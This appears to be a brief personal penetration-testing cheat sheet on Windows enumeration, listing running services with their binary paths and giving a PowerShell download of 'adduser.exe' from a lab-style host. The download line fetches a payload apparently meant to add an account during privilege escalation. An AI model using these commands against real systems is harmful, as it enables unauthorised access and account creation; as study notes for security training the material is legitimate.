# Windows Enumeration

### Listing Installed Windows Binaries
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Ivoke Web Request (get stuff from web site)
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
